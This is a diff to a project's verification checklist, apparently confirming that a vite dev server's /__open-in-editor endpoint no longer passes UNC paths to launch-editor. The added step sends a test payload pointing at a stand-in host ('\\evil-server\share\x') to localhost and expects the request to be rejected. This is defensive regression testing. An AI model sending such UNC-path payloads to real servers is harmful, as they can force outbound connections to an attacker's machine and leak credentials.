@@ -57,12 +57,17 @@ run all of it before calling the feature done. Commands are PowerShell (Windows 
    npm run typecheck
    ```
 
-2. The active vector is gone - the dev server no longer exposes the endpoint:
+2. The active vector is closed. `npm ls launch-editor` is empty because vite now bundles it inside
+   its own `dist/node` output, not because the route disappeared - the route still responds. What
+   matters is that the UNC-path payload never reaches the vulnerable call:
 
    ```powershell
-   npm ls launch-editor                 # expect: (empty)
-   # with dev server running:
-   Invoke-WebRequest http://localhost:5173/__open-in-editor?file=x   # expect: 404, not 200/500
+   npm ls launch-editor                 # expect: (empty) - bundled inside vite, see research.md R1
+   # with dev server running, plain request (route still exists, this is NOT the security check):
+   Invoke-WebRequest http://localhost:5173/__open-in-editor?file=x
+   # the actual check - send the real attack payload (a UNC path); expect a 500 raised by
+   # launch-editor's own UNC guard BEFORE any filesystem/network call, not a successful launch:
+   Invoke-WebRequest ("http://localhost:5173/__open-in-editor?file=" + [uri]::EscapeDataString("\\evil-server\share\x"))
    ```
 
 3. Dev-mode smoke (vite proxy + websocket): `npm run dev` at repo root; open the app, log in,
